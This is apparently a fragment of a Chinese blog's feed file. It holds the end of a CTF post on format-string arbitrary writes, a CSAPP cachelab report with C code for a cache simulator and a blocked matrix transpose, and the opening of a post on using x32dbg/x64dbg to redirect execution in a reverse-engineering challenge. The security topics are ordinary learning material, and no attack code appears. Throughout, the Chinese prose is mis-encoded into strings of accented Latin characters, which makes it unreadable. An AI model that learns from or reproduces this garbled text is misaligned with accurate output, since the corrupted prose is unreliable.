éœ€è¦ç®—åç§»ç„¶åå°†åœ°å€ç»™æ ¼å¼åŒ–å­—ç¬¦ä¸²å®šç‚¹ä¿®æ”¹æŸä¸ªå˜é‡çš„å€¼ï¼Œè¿™å°±æ˜¯æ‰€è°“çš„ä»»æ„å†™ã€‚</p><p><img src="https://i.loli.net/2021/06/05/ZLVsORBKiYxXA5I.png" alt="format string_2.png"></p><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°ï¼Œé€šè¿‡æˆ‘çš„è¾“å…¥æˆåŠŸæ”¹å˜äº†ä¸‰ä¸ªå˜é‡çš„å€¼</p><p>è¿™å°±æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„åˆ©ç”¨ã€‚ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>cachelabå®éªŒæŠ¥å‘Š:æ¨¡æ‹Ÿcacheçš„åŠŸèƒ½</title>
      <link href="/2021/05/22/cachelab/"/>
      <url>/2021/05/22/cachelab/</url>
      
        <content type="html"><![CDATA[<p><code>lab</code>ä»è¿™é‡Œå¼€å§‹å˜å¾—éš¾äº†èµ·æ¥äº†ï¼Œè¿™æ¬¡è¦æ¨¡æ‹Ÿè®¡ç®—æœºé‡Œçš„ä¸€ä¸ªç¡¬ä»¶-<code>cache</code>çš„å·¥ä½œï¼Œå…³äº<code>cache</code>ï¼Œç™¾åº¦ç™¾ç§‘ä»‹ç»çš„æ¯”æˆ‘å¥½ï¼Œè¿™è¾¹è¯·<a href="https://baike.baidu.com/item/CACHE%E5%AD%98%E5%82%A8%E5%99%A8/12789048?fr=aladdin">â€”â€”â€”&gt;</a></p><span id="more"></span><p>ç„¶åå’±ä»¬å°±å…ˆæ‹¿åˆ°å®éªŒç”¨çš„æ–‡ä»¶ä»¥åŠä»–çš„<code>writeup</code>ï¼Œçœ‹å®Œä¸€ä¼šä¹‹å<code>(long long after)</code>å°±çŸ¥é“äº†æ­¤æ¬¡å®éªŒçš„ç›®çš„ã€‚ç„¶åæ–‡ä»¶ä¹ŸçŸ¥é“çš„ä¸€æ¸…äºŒæ¥šäº†ã€‚</p><p><code>csim.c</code>:ç”¨æ¥åšpart Açš„ä¸»è¦æ–‡ä»¶ã€‚</p><p>tra<code>n</code>s.c:ç”¨æ¥åšpart Bçš„ä¸»è¦æ–‡ä»¶ã€‚</p><h2 id="Part-A"><a href="#Part-A" class="headerlink" title="Part A"></a>Part A</h2><p><code>writeup</code>é‡Œé¢å·²ç»æåˆ°äº†ï¼Œ<code>cache.h</code>å¤´æ–‡ä»¶é‡Œé¢æœ‰æ‰€éœ€çš„å‡½æ•°å¹¶ä¸”è¦åœ¨<code>csim.c</code>é‡Œé¢å®Œæˆ<code>cache</code>çš„æ¨¡æ‹Ÿè¿‡ç¨‹ï¼Œé‚£ä¹ˆé¦–å…ˆæˆ‘ä»¬çœ‹çœ‹<code>cache.h</code>å¤´æ–‡ä»¶æä¾›äº†å“ªäº›ä¸œè¥¿</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * cachelab.h - Prototypes for Cache Lab helper functions</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CACHELAB_TOOLS_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CACHELAB_TOOLS_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_TRANS_FUNCS 100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">trans_func</span>&#123;</span></span><br><span class="line">  <span class="keyword">void</span> (*func_ptr)(<span class="keyword">int</span> M,<span class="keyword">int</span> N,<span class="keyword">int</span>[N][M],<span class="keyword">int</span>[M][N]);</span><br><span class="line">  <span class="keyword">char</span>* description;</span><br><span class="line">  <span class="keyword">char</span> correct;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> num_hits;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> num_misses;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> num_evictions;</span><br><span class="line">&#125; <span class="keyword">trans_func_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * printSummary - This function provides a standard way for your cache</span></span><br><span class="line"><span class="comment"> * simulator * to display its final hit and miss statistics</span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printSummary</span><span class="params">(<span class="keyword">int</span> hits,  <span class="comment">/* number of  hits */</span></span></span></span><br><span class="line"><span class="params"><span class="function">                  <span class="keyword">int</span> misses, <span class="comment">/* number of misses */</span></span></span></span><br><span class="line"><span class="params"><span class="function">                  <span class="keyword">int</span> evictions)</span></span>; <span class="comment">/* number of evictions */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Fill the matrix with data */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initMatrix</span><span class="params">(<span class="keyword">int</span> M, <span class="keyword">int</span> N, <span class="keyword">int</span> A[N][M], <span class="keyword">int</span> B[M][N])</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* The baseline trans function that produces correct results. */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">correctTrans</span><span class="params">(<span class="keyword">int</span> M, <span class="keyword">int</span> N, <span class="keyword">int</span> A[N][M], <span class="keyword">int</span> B[M][N])</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Add the given function to the function list */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">registerTransFunction</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">void</span> (*trans)(<span class="keyword">int</span> M,<span class="keyword">int</span> N,<span class="keyword">int</span>[N][M],<span class="keyword">int</span>[M][N]), <span class="keyword">char</span>* desc)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* CACHELAB_TOOLS_H */</span></span></span><br></pre></td></tr></table></figure><p>ç”¨æˆ‘é‚£-4çº§çš„è‹±è¯­æ°´å¹³æ¥ç¿»è¯‘å¤§æ¦‚å°±æ˜¯å®šä¹‰äº†ä¸€ä¸ªç»“æ„ä½“ï¼Œç»“æ„ä½“é‡Œæœ‰æµ‹è¯•<code>cache</code>çš„ä¸€äº›æŒ‡æ ‡ï¼Œè¯¸å¦‚å‘½ä¸­æ¬¡æ•°è¿™äº›çš„ä¸œè¥¿ï¼Œæ‰€ä»¥è¿™ä¸ªç»“æ„ä½“å°±å½“æˆ<code>cache</code>å§ã€‚</p><p>é‚£ä¹ˆå°±å¾ˆå¥½å†™(chao)<code>csim.c</code>çš„ä»£ç äº†ï¼Œå¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;cachelab.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;limits.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;getopt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span> </span></span><br><span class="line"><span class="keyword">int</span> help_mode, verbose_mode, s, E, b, S,number_hits, number_miss, number_eviction;</span><br><span class="line"><span class="comment">//S is the number of sets, E is the associativity, b is number of block bits</span></span><br><span class="line"><span class="keyword">char</span> filename[<span class="number">1000</span>];<span class="comment">//The file name</span></span><br><span class="line"><span class="keyword">char</span> buffer[<span class="number">1000</span>];<span class="comment">//The buffer of input</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> valid_bit, tag, stamp;<span class="comment">//cold miss</span></span><br><span class="line">&#125;cache_line;</span><br><span class="line">cache_line **cache = <span class="literal">NULL</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">update</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> address)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> max_stamp = INT_MIN, max_stamp_id = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span>  t_address, s_address;<span class="comment">// The t value and s value of address</span></span><br><span class="line">    s_address = (address &gt;&gt; b) &amp; ((<span class="number">-1U</span>) &gt;&gt; (<span class="number">32</span> - s));<span class="comment">//use bit manipulation to get s_address, -1U equals to INT_MAX</span></span><br><span class="line">    t_address = address &gt;&gt; (s + b);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; E; i++)<span class="comment">//check whether there is a hit</span></span><br><span class="line">        <span class="keyword">if</span>(cache[s_address][i].tag == t_address)<span class="comment">//which means a hit</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//is_placed = 1;</span></span><br><span class="line">            cache[s_address][i].stamp = <span class="number">0</span>;<span class="comment">//restart the time stamp control unit</span></span><br><span class="line">            number_hits++;</span><br><span class="line">            <span class="comment">//printf(&quot;hit\n&quot;);</span></span><br><span class="line">            <span class="keyword">return</span> ;<span class="comment">//just return now</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">//to check whether is an empty line</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; E; i++)</span><br><span class="line">        <span class="keyword">if</span>(cache[s_address][i].valid_bit == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            cache[s_address][i].valid_bit = <span class="number">1</span>;</span><br><span class="line">            cache[s_address][i].tag = t_address;</span><br><span class="line">            cache[s_address][i].stamp = <span class="number">0</span>;</span><br><span class="line">            number_miss++;<span class="comment">//compulsory miss</span></span><br><span class="line">            <span class="comment">//printf(&quot;miss\n&quot;);</span></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">//If there is not any empty line, then an eviction will occur</span></span><br><span class="line">    number_eviction++;</span><br><span class="line">    number_miss++;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; E; i++)</span><br><span class="line">        <span class="keyword">if</span>(cache[s_address][i].stamp &gt; max_stamp)</span><br><span class="line">        &#123;</span><br><span class="line">            max_stamp = cache[s_address][i].stamp;</span><br><span class="line">            max_stamp_id = i;</span><br><span class="line">        &#125;</span><br><span class="line">    cache[s_address][max_stamp_id].tag = t_address;</span><br><span class="line">    cache[s_address][max_stamp_id].stamp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">update_time</span><span class="params">(<span class="keyword">void</span>)</span><span class="comment">//update the time stamp of each cache line</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; S; i++)</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; E; j++)</span><br><span class="line">            <span class="keyword">if</span>(cache[i][j].valid_bit == <span class="number">1</span>)<span class="comment">//if valid</span></span><br><span class="line">                cache[i][j].stamp++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> opt, temp;<span class="comment">//The getopt return value</span></span><br><span class="line">    <span class="keyword">char</span> type;<span class="comment">//type of a single trace record</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> address;<span class="comment">//address of memory</span></span><br><span class="line">    number_hits = number_miss = number_eviction = <span class="number">0</span>;<span class="comment">//initialization</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">-1</span> != (opt = (getopt(argc, argv, <span class="string">&quot;hvs:E:b:t:&quot;</span>))))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">switch</span>(opt)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;h&#x27;</span>:help_mode = <span class="number">1</span>;</span><br><span class="line">                     <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;v&#x27;</span>:verbose_mode = <span class="number">1</span>;</span><br><span class="line">                     <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:s = atoi(optarg);</span><br><span class="line">                     <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;E&#x27;</span>:E = atoi(optarg);</span><br><span class="line">                     <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:b = atoi(optarg);</span><br><span class="line">                     <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;t&#x27;</span>:<span class="built_in">strcpy</span>(filename, optarg);</span><br><span class="line">                     <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(help_mode == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        system(<span class="string">&quot;cat help_info&quot;</span>);<span class="comment">//&quot;help_info&quot; is a text file containing help information</span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    FILE* fp = fopen(filename,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(fp == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;The File is wrong!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    S = (<span class="number">1</span> &lt;&lt; s); <span class="comment">// S equals to 2^s</span></span><br><span class="line">    cache = (cache_line**)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(cache_line*) * S);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; S; i++)</span><br><span class="line">        cache[i] = (cache_line*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(cache_line) * E);<span class="comment">//Important! malloc each row of cache</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; S; i++)</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; E; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            cache[i][j].valid_bit = <span class="number">0</span>;</span><br><span class="line">            cache[i][j].tag = cache[i][j].stamp = <span class="number">-1</span>;</span><br><span class="line">        &#125;<span class="comment">//initialization</span></span><br><span class="line">    <span class="keyword">while</span>(fgets(buffer,<span class="number">1000</span>,fp))<span class="comment">//get a whole line</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">sscanf</span>(buffer,<span class="string">&quot; %c %xu,%d&quot;</span>, &amp;type, &amp;address, &amp;temp);<span class="comment">//hexdecimal</span></span><br><span class="line">        <span class="keyword">switch</span>(type)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;L&#x27;</span>:update(address);</span><br><span class="line">                     <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span>:update(address);<span class="comment">//just let it fall through, do twice</span></span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;S&#x27;</span>:update(address);</span><br><span class="line">                     <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        update_time();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; S; i++)</span><br><span class="line">        <span class="built_in">free</span>(cache[i]);<span class="comment">//free allocated space first</span></span><br><span class="line">    <span class="built_in">free</span>(cache);</span><br><span class="line">    fclose(fp);</span><br><span class="line">    printSummary(number_hits, number_miss, number_eviction);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æµ‹è¯•ï¼š</p><p><img src="https://i.loli.net/2021/05/23/qTi9oVAtbpeRYnk.png" alt="Cachelab_PartA_1.png"></p><h2 id="Part-B"><a href="#Part-B" class="headerlink" title="Part B"></a>Part B</h2><p>ä¼˜åŒ–çŸ©é˜µè½¬ç½®å‡½æ•°ï¼Œä½¿å¾—cache misså°½å¯èƒ½å°‘,ä¸è¶…è¿‡12ä¸ªä¸´æ—¶å˜é‡</p><h3 id="32-x-32"><a href="#32-x-32" class="headerlink" title="32 x 32"></a>32 x 32</h3><p>ç›´æ¥è½¬ç½®æ˜¯è‚¯å®šä¸è¡Œçš„ï¼Œè¿™éƒ½ä¸ç”¨å»è¯•(å®åˆ™è´¥è€Œå½’æ¥)ã€‚ä¼—æ‰€å‘¨çŸ¥ï¼Œåˆ†å—æ˜¯ä¸€ä¸ªå¾ˆå¥½ç”¨çš„ç®—æ³•</p><p>32ä½å­—èŠ‚çš„æ•°æ®ï¼Œä¸€ä¸ªint4å­—èŠ‚ï¼Œæ¯è¡Œ/åˆ—æœ‰8ä¸ªintï¼Œæˆ‘ä»¬å°†å…¶åˆ†å—ä¸º8x8ï¼Œè¿›è¡Œå¤„ç†</p><p>å……åˆ†åˆ©ç”¨è¿™äº›å˜é‡å³å¯å†™å‡º</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(M == <span class="number">32</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> i, j, k, v1, v2, v3, v4, v5, v6, v7, v8;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i += <span class="number">8</span>)</span><br><span class="line">            <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">32</span>; j += <span class="number">8</span>)</span><br><span class="line">                <span class="keyword">for</span>(k = i; k &lt; (i + <span class="number">8</span>); ++k)</span><br><span class="line">                &#123;</span><br><span class="line">                    v1 = A[k][j];</span><br><span class="line">                    v2 = A[k][j+<span class="number">1</span>];</span><br><span class="line">                    v3 = A[k][j+<span class="number">2</span>];</span><br><span class="line">                    v4 = A[k][j+<span class="number">3</span>];</span><br><span class="line">                    v5 = A[k][j+<span class="number">4</span>];</span><br><span class="line">                    v6 = A[k][j+<span class="number">5</span>];</span><br><span class="line">                    v7 = A[k][j+<span class="number">6</span>];            </span><br><span class="line">                    v8 = A[k][j+<span class="number">7</span>];</span><br><span class="line">                    B[j][k] = v1;</span><br><span class="line">                    B[j+<span class="number">1</span>][k] = v2;</span><br><span class="line">                    B[j+<span class="number">2</span>][k] = v3;</span><br><span class="line">                    B[j+<span class="number">3</span>][k] = v4;</span><br><span class="line">                    B[j+<span class="number">4</span>][k] = v5;</span><br><span class="line">                    B[j+<span class="number">5</span>][k] = v6;</span><br><span class="line">                    B[j+<span class="number">6</span>][k] = v7;</span><br><span class="line">                    B[j+<span class="number">7</span>][k] = v8;</span><br><span class="line">                &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæš‚æ—¶å…ˆç«‹ä¸ªflagåœ¨è¿™é‡Œï¼Œç­‰ä¹‹åä¼šåšäº†å†åšå§ï¼Œåé¢çš„çœŸçš„åšçš„ä¸å¤ªè¡Œäº†ã€‚ã€‚ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> csapp </category>
          
          <category> lab </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>åŠ¨æ€è°ƒè¯•å·¥å…·çš„ä½¿ç”¨</title>
      <link href="/2021/05/22/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/"/>
      <url>/2021/05/22/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/</url>
      
        <content type="html"><![CDATA[<p>åšäº†è¿™ä¹ˆä¹…çš„<code>pwn</code>ä¹‹ååˆå¾—å…¼é¡¾ä¸€ä¸‹<code>re</code>äº†å“ˆå“ˆå“ˆã€‚åºŸè¯ä¸å¤šè¯´ï¼Œè¿™å‘¨å­¦äº†åŠ¨æ€è°ƒè¯•å™¨çš„ä½¿ç”¨ï¼Œå¹¶ä¸”è½»æ¾è§£å‡ºäº†é‚£å‡ é“é¢˜ç›®ã€‚</p><span id="more"></span><p><code>linux</code>ä¸‹çš„åŠ¨æ€è°ƒè¯•å™¨éƒ½çŸ¥é“ï¼Œ<code>gdb</code>æ°¸è¿œçš„ç¥ï¼Œ<code>windows</code>çš„åŠ¨æ€è°ƒè¯•å™¨å°±æ¯”è¾ƒå„è‰²äº†ï¼Œ<code>ollydbg</code>ï¼Œ<code>x32dbg</code>ï¼Œ<code>x64dbg</code>ã€‚è¿™é‡Œæˆ‘ç”¨çš„æ˜¯åä¸¤ä¸ªè°ƒè¯•å™¨ï¼Œ<code>ollydbg</code>å¬å¸ˆå‚…ä»¬è¯´æ˜¯ä¸æ›´æ–°äº†è¿˜æ˜¯å’‹åœ°ä¹Ÿä¸çŸ¥é“ï¼Œæ‰€ä»¥å°±ç”¨äº†x32å’Œ<code>x64dbg</code>ï¼Œå…¶å®çœ‹äº†ä¸€ä¸‹ç•Œé¢éƒ½å·®ä¸å¤šçš„ã€‚</p><p>åŠ¨æ€è°ƒè¯•æ³¨æ„çš„å°±æ˜¯ä¸‹æ–­ç‚¹ï¼Œæ”¹å€¼è¿™ä¸€ç³»åˆ—æ“ä½œï¼Œè®©ç¨‹åºæŒ‰ç…§ä½ æƒ³çš„æ‰§è¡Œã€‚æ¯”å¦‚æœ‰ä¸€ä¸ªå‡½æ•°å°±æ˜¯ç›´æ¥è¾“å‡º<code>flag</code>ï¼Œä½†æ˜¯å®ƒç›´æ¥åˆæ²¡æœ‰å®Œå…¨ç›´æ¥ç»™ä½ ï¼Œé‚£æ€ä¹ˆåŠï¼Ÿæˆ‘ç›´æ¥æ”¹<code>eip</code>å»æ‰§è¡Œé‚£ä¸ªå‡½æ•°ä¸å°±okäº†ï¼Ÿä¸<code>pwn</code>ä¸ä¸€æ ·ï¼Œ<code>pwn</code>æˆ‘è¦é€šè¿‡æ¼æ´å»æ‰§è¡Œï¼Œè¿™ä¸ªçš„è¯æ–‡ä»¶æ§åˆ¶æƒé™å’Œè¿™å°è®¡ç®—æœºçš„æƒé™å…¨éƒ¨åœ¨æˆ‘æ‰‹ä¸Šï¼Œå®ƒæ€ä¹ˆè¿è¡Œæˆ‘è¯´çš„ç®—ï¼Œå¯¹ä¸å¯¹ï¼Ÿé‚£ä¹ˆæ¥ä¸‹æ¥çœ‹å‡ é“ä¾‹é¢˜ï¼Œè¿™ä¸ªä¸æ˜¯è¯´åªæœ‰åŠ¨è°ƒèƒ½åšï¼Œä½†æ˜¯ä¼šåŠ¨è°ƒä¸€å®šæ¯”ä¸ä¼šçš„å ä¼˜åŠ¿ï¼Œè¿™æ˜¯çœŸçš„ã€‚</p><h2 id="xctf-game"><a href="#xctf-game" class="headerlink" title="xctf-game"></a><a href="https://adworld.xctf.org.cn/task/answer?type=reverse&number=4&grade=0&id=5074&page=1">xctf-game</a></h2><p>ä¸‹è½½æ–‡ä»¶å¹¶ä¸”æ ¹æ®å®ƒçš„æè¿°å¯ä»¥çœ‹åˆ°æ˜¯ä¸€ä¸ª32ä½PEæ–‡ä»¶ä¸”æ˜¯ä¸€ä¸ªç±»ä¼¼æ¸¸æˆçš„ç¨‹åºï¼Œé€»è¾‘å¾ˆç®€å•ï¼Œè¾“å…¥åºåˆ—ç„¶åé€šè¿‡å®ƒå‡½æ•°çš„åˆ¤æ–­å°±å¯ä»¥è®©ç¨‹åºè¾“å‡º<code>flag</code>ã€‚ä½†æ˜¯</p><p><img src="https://i.loli.net/2021/05/22/ufkspBM3bHW1VgN.png" alt="xctf_game_1.png"></p><p>è¿™ä¸ªå‡½æ•°ä¸ä»…å¤æ‚ï¼Œç›´æ¥ä»è¿™é‡Œç 